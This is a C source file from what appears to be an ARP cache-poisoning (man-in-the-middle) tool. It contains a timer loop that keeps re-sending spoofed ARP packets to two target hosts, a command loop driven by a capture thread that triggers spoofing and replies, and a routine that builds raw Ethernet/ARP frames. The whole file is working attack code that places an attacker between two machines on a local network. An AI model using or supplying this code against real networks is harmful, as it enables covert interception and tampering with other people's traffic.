#include <math.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <send.h>
#include <strat.h>
#include <main.h>
#include <protocols.h>

void refresh_spoof(int signal) {

  if(up_count_1 <= 1) {
    send_arp_request(poison_parameters->context->target_2_ip, poison_parameters->context->our_ether,
      poison_parameters->context->target_1_ip, poison_parameters->context->target_1_ether);
  } else spoof_target(poison_parameters->context, 1);

  if(up_count_2 <= 1) {
    send_arp_request(poison_parameters->context->target_1_ip, poison_parameters->context->our_ether,
      poison_parameters->context->target_2_ip, poison_parameters->context->target_2_ether);
  } else spoof_target(poison_parameters->context, 2);

  if(! up_count_1) printf("Target %u.%u.%u.%u seems down\n",
    ((uint8_t*)&poison_parameters->context->target_1_ip)[0], ((uint8_t*)&poison_parameters->context->target_1_ip)[1], ((uint8_t*)&poison_parameters->context->target_1_ip)[2], ((uint8_t*)&poison_parameters->context->target_1_ip)[3]);
  if(! up_count_2) printf("Target %u.%u.%u.%u seems down\n",
    ((uint8_t*)&poison_parameters->context->target_2_ip)[0], ((uint8_t*)&poison_parameters->context->target_2_ip)[1], ((uint8_t*)&poison_parameters->context->target_2_ip)[2], ((uint8_t*)&poison_parameters->context->target_2_ip)[3]);

  if(up_count_1 >= 0) up_count_1--;
  if(up_count_2 >= 0) up_count_2--;

  // Reset timer
  alarm(REFRESH_LOOP_INT);
}

void* poison_loop(void* raw_args) {
  poison_parameters = (struct poison_loop_arg_t*)raw_args;

  #if REFRESH_LOOP_INT > HOST_DOWN_AFTER
    fprintf(stderr, "Error, REFRESH_LOOP_INT can not be bigger than HOST_DOWN_AFTER\n");
    return NULL;
  #endif

  unsigned int down_count = ceil(HOST_DOWN_AFTER / REFRESH_LOOP_INT);
  up_count_1 = down_count;
  up_count_2 = down_count;

  if(signal(SIGALRM, refresh_spoof) == SIG_ERR) {
    fprintf(stderr, "Cannot bind routine for signal SIGALRM (SIG_ERR)\n");
    return NULL;
  }
  alarm(REFRESH_LOOP_INT); // Start the refresh loop

  uint8_t cmd, action, target;
  int ret;
  while((ret = read(poison_parameters->pip, &cmd, 1))) { // Realise action asked by the capture thread
    if(ret == -1) {
      perror("read ");
      return NULL;
    }
    action = (cmd >> 4);
    target = (cmd & 0xf);
    switch(action) {
      case SEND_CMD_LOC: // Target n is up
        {
          int8_t* up_count = (target == 1) ? &up_count_1 : &up_count_2;

          if(*up_count == -1) {
            uint8_t* ip = (target == 1) ? (uint8_t*)&poison_parameters->context->target_1_ip : (uint8_t*)&poison_parameters->context->target_2_ip;
            printf("Target %u.%u.%u.%u is back up\n", ip[0], ip[1], ip[2], ip[3]);
          }

          *up_count = down_count;
        }
        break;
      case SEND_CMD_RPL: // reply to who-has
        reply_to_target(poison_parameters->context, target);
        break;
      case SEND_CMD_SPF: // spoof target
        spoof_target(poison_parameters->context, target);
        break;
    }
  }

  return NULL;
}

int send_arp(uint16_t op, uint8_t* ether_MAC_src, uint8_t* ether_MAC_dst, uint8_t* arp_MAC_src,
   uint32_t arp_ip_src, uint8_t* arp_MAC_dst, uint32_t arp_ip_dst) {

     char buff[sizeof(struct ethernet_header) + sizeof(struct arp_header)];
     struct ethernet_header* ether_p = (struct ethernet_header*)buff;
     struct arp_header* arp_p = (struct arp_header*)(buff + sizeof(struct ethernet_header));

     // Ethernet header
     memcpy(ether_p->ether_dhost, ether_MAC_dst, 6);
     memcpy(ether_p->ether_shost, ether_MAC_src, 6);
     ether_p->ether_type = 0x0608;

     // ARP header
     arp_p->hdw_type = 0x0100;
     arp_p->protocol = 0x0008;
     arp_p->ether_addr_len = 6;
     arp_p->protocol_addr_len = 4;
     arp_p->operation = htons(op);
     memcpy(arp_p->MAC_src, arp_MAC_src, 6);
     memcpy(arp_p->MAC_target, arp_MAC_dst, 6);
     *((uint32_t*)arp_p->ip_src) = arp_ip_src;
     *((uint32_t*)arp_p->ip_target) = arp_ip_dst;

     // Send to raw socket
     return send_frame(buff, sizeof(struct ethernet_header) + sizeof(struct arp_header));
}
